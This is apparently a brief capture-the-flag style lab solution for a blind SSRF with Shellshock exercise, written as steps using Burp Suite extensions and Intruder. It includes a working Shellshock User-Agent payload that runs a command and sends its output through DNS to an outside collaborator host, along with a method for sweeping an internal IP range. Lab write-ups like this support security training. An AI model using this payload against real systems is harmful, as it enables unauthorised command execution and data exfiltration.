# Blind SSRF with Shellshock exploitation
Solution:
- Download the `Collaborator Everywhere` extension from burp extender
- When browsing the website, we'll get alert that we get collaborator pingback on the Referer and User agent headers
- Change the User agent to shellshock payload
```sh
	() { :; }; /usr/bin/nslookup $(whoami).<random burp collaborator URL>
```
- Now add the internal server IP address `192.168.0.1:8080` to the Referer header. Send this to burp intruder.
- Mark the last octet `ยง1ยง` for the FUZZing parameter
- Run intruder from `1` to `255` and we'll get a DNS query from one of these
